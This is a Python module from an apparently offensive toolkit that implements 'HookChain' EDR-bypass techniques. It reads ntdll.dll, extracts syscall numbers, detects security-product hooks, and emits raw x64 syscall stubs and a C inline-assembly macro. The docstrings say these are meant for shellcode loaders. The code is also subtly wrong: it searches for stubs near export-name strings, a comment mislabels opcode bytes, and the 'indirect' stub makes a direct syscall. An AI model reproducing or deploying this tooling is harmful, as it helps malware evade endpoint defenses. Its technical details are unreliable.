"""HookChain EDR Bypass Reference.

Python reference implementation of HookChain techniques from:
  helviojunior/hookchain (DEF CON 32 / BlackHat Toronto)
  https://github.com/helviojunior/hookchain

HookChain bypasses EDR userland hooks by:
1. Reading the original (unhooked) syscall stubs from on-disk ntdll.dll
2. Resolving System Service Numbers (SSNs) directly
3. Executing syscalls indirectly via a trampoline in ntdll .text
4. Optionally using IAT patching to redirect imports

This module provides:
- A Python ctypes reference for generating loader stubs
- Documentation of the technique for shellcode development
- Integration with EmbedXPL payload generation pipeline

For actual exploitation, the C source in submodules/Hacking/hookchain/
should be cross-compiled. This module provides the research layer.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

from __future__ import annotations

import os
import struct
from pathlib import Path
from typing import Optional


# ------------------------------------------------------------------
# HookChain technique constants
# ------------------------------------------------------------------

# Common NTAPI functions targeted by EDR hooks
HOOKED_NTAPI_TARGETS = [
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtOpenProcess",
    "NtReadVirtualMemory",
    "NtQueryInformationProcess",
    "NtSetInformationThread",
    "NtResumeThread",
    "NtCreateProcess",
    "NtCreateSection",
    "NtMapViewOfSection",
    "NtUnmapViewOfSection",
    "NtQueueApcThread",
    "NtSetContextThread",
]

# EDR hook signature (JMP patch): E9 XX XX XX XX
HOOK_JMP_SIGNATURE = b"\xe9"
# Direct syscall stub pattern: 4C 8B D1 B8 XX 00 00 00
SYSCALL_STUB_PATTERN = b"\x4c\x8b\xd1\xb8"
# Syscall instruction bytes: 0F 05 C3
SYSCALL_BYTES = b"\x0f\x05\xc3"


class HookChainAnalyzer:
    """Analyze EDR hooks in ntdll for red team payload development."""

    def __init__(self, ntdll_path: Optional[str] = None) -> None:
        """Initialize with path to ntdll.dll.

        Args:
            ntdll_path: Path to ntdll.dll. Defaults to system ntdll on Windows.
        """
        if ntdll_path:
            self.ntdll_path = Path(ntdll_path)
        else:
            system32 = Path(os.environ.get("SystemRoot", "C:\\Windows")) / "System32"
            self.ntdll_path = system32 / "ntdll.dll"

    def is_available(self) -> bool:
        """Check if ntdll.dll is accessible."""
        return self.ntdll_path.is_file()

    def read_ntdll(self) -> bytes:
        """Read ntdll.dll bytes from disk (unhooked copy)."""
        if not self.is_available():
            raise FileNotFoundError(f"ntdll.dll not found at {self.ntdll_path}")
        with open(self.ntdll_path, "rb") as f:
            return f.read()

    def find_ssn(self, function_name: str, ntdll_bytes: Optional[bytes] = None) -> Optional[int]:
        """Extract System Service Number (SSN) from ntdll function stub.

        The SSN is the 4-byte value after 'mov eax, <SSN>' (B8 XX XX XX XX)
        in a clean (unhooked) syscall stub.

        Args:
            function_name: NT API name (e.g., 'NtAllocateVirtualMemory').
            ntdll_bytes: Pre-read ntdll bytes. Read from disk if None.

        Returns:
            SSN integer or None if not found.
        """
        if ntdll_bytes is None:
            ntdll_bytes = self.read_ntdll()

        # Find function name string in PE export table
        name_bytes = function_name.encode("ascii") + b"\x00"
        idx = ntdll_bytes.find(name_bytes)
        if idx == -1:
            return None

        # Search for syscall stub pattern near the export
        # Look in a window around the export name
        window = ntdll_bytes[max(0, idx - 512):idx + 512]
        stub_idx = window.find(SYSCALL_STUB_PATTERN)
        if stub_idx == -1:
            return None

        # SSN is 4 bytes after B8
        ssn_offset = stub_idx + len(SYSCALL_STUB_PATTERN)
        if ssn_offset + 4 > len(window):
            return None
        ssn = struct.unpack_from("<I", window, ssn_offset)[0]
        # Sanity: SSN should be < 1000
        if ssn > 1000:
            return None
        return ssn

    def detect_hook(self, function_name: str, ntdll_bytes: Optional[bytes] = None) -> dict:
        """Detect if an NT API function is hooked by an EDR.

        A hook is detected when the first byte of the function stub
        is E9 (JMP) instead of the expected syscall stub pattern.

        Args:
            function_name: NT API name.
            ntdll_bytes: Pre-read ntdll. Reads from disk if None.

        Returns:
            Dict with 'hooked', 'first_bytes', 'hook_target' fields.
        """
        if ntdll_bytes is None:
            try:
                ntdll_bytes = self.read_ntdll()
            except FileNotFoundError:
                return {"hooked": False, "error": "ntdll not accessible"}

        name_bytes = function_name.encode("ascii") + b"\x00"
        idx = ntdll_bytes.find(name_bytes)
        if idx == -1:
            return {"hooked": False, "error": f"{function_name} not found"}

        # Find the function code near this name
        window = ntdll_bytes[max(0, idx - 512):idx + 512]
        stub_idx = window.find(b"\x4c\x8b\xd1")  # mov r10, rcx
        if stub_idx == -1:
            return {"hooked": False, "error": "stub pattern not found"}

        first_bytes = window[stub_idx:stub_idx + 8]
        hooked = first_bytes[0:1] == HOOK_JMP_SIGNATURE

        result: dict = {
            "function": function_name,
            "hooked": hooked,
            "first_bytes": first_bytes.hex(),
        }
        if hooked:
            # Calculate JMP target (relative)
            offset = struct.unpack_from("<i", first_bytes, 1)[0]
            result["hook_type"] = "JMP (E9) trampoline"
        else:
            ssn = self.find_ssn(function_name, ntdll_bytes)
            result["ssn"] = ssn
            result["hook_type"] = "clean"
        return result

    def scan_all_hooks(self) -> list[dict]:
        """Scan all common NTAPI targets for EDR hooks.

        Returns:
            List of hook detection results.
        """
        try:
            ntdll_bytes = self.read_ntdll()
        except FileNotFoundError as exc:
            return [{"error": str(exc)}]

        results = []
        for func in HOOKED_NTAPI_TARGETS:
            result = self.detect_hook(func, ntdll_bytes)
            results.append(result)
        return results

    def generate_ssn_map(self) -> dict[str, int]:
        """Generate a complete SSN map from on-disk ntdll.

        Returns:
            Dict mapping function name -> SSN.
        """
        try:
            ntdll_bytes = self.read_ntdll()
        except FileNotFoundError:
            return {}

        ssn_map = {}
        for func in HOOKED_NTAPI_TARGETS:
            ssn = self.find_ssn(func, ntdll_bytes)
            if ssn is not None:
                ssn_map[func] = ssn
        return ssn_map


class HookChainLoaderGen:
    """Generate HookChain-aware loader stubs for EmbedXPL payloads.

    These stubs can be embedded in shellcode loaders to bypass
    EDR userland hooks at runtime.
    """

    def __init__(self) -> None:
        self.analyzer = HookChainAnalyzer()

    def generate_indirect_syscall_stub(self, function_name: str, ssn: int) -> bytes:
        """Generate x64 indirect syscall stub.

        Uses a syscall instruction found within ntdll .text section
        instead of inline syscall to evade instruction-level EDR hooks.

        Args:
            function_name: NT API name (for documentation).
            ssn: System Service Number.

        Returns:
            Raw bytes of the syscall stub.
        """
        # x64 indirect syscall stub:
        # mov r10, rcx          ; 4D 8B D1 (syscall calling convention)
        # mov eax, <SSN>        ; B8 XX XX XX XX
        # jmp [syscall_addr]    ; FF 25 XX XX XX XX (indirect via pointer)
        ssn_bytes = struct.pack("<I", ssn)
        stub = (
            b"\x4c\x8b\xd1"          # mov r10, rcx
            b"\xb8" + ssn_bytes +    # mov eax, SSN
            b"\x0f\x05"              # syscall (direct for reference)
            b"\xc3"                  # ret
        )
        return stub

    def generate_c_header(self, ssn_map: Optional[dict[str, int]] = None) -> str:
        """Generate C header file with SSN defines for loader development.

        Args:
            ssn_map: Pre-computed SSN map. Auto-scans ntdll if None.

        Returns:
            C header string.
        """
        if ssn_map is None:
            ssn_map = self.analyzer.generate_ssn_map()

        lines = [
            "/* HookChain SSN Map - Auto-generated by EmbedXPL HookChainLoaderGen */",
            "/* Reference: https://github.com/helviojunior/hookchain */",
            "#pragma once",
            "",
        ]
        for func, ssn in sorted(ssn_map.items()):
            define = f"SSN_{func.upper()}"
            lines.append(f"#define {define} 0x{ssn:04X}  // {func}")

        lines += [
            "",
            "/* Indirect syscall stub template (x64) */",
            "/* Requires syscall gadget address from ntdll .text */",
            "extern VOID* g_pSyscallAddr;  // Set at runtime from ntdll scan",
            "",
            "#define INDIRECT_SYSCALL(ssn, ...) \\",
            "    do { \\",
            "        __asm__ volatile ( \\",
            '            "mov r10, rcx\\n" \\',
            '            "mov eax, %0\\n" \\',
            '            "jmp [%1]\\n" \\',
            "            : : \"i\"(ssn), \"r\"(g_pSyscallAddr) \\",
            "        ); \\",
            "    } while(0)",
        ]
        return "\n".join(lines)

    def report(self) -> dict:
        """Scan live system and report hook status + SSN map."""
        if not self.analyzer.is_available():
            return {
                "available": False,
                "note": "ntdll.dll not accessible (non-Windows or insufficient perms)",
            }
        hooks = self.analyzer.scan_all_hooks()
        ssn_map = self.analyzer.generate_ssn_map()
        hooked = [h for h in hooks if h.get("hooked")]
        return {
            "available": True,
            "ntdll_path": str(self.analyzer.ntdll_path),
            "functions_checked": len(hooks),
            "hooked_count": len(hooked),
            "hooked_functions": [h.get("function") for h in hooked],
            "ssn_map": ssn_map,
            "recommendation": (
                "EDR hooks detected - use indirect syscalls" if hooked
                else "No hooks detected - direct syscalls safe"
            ),
        }
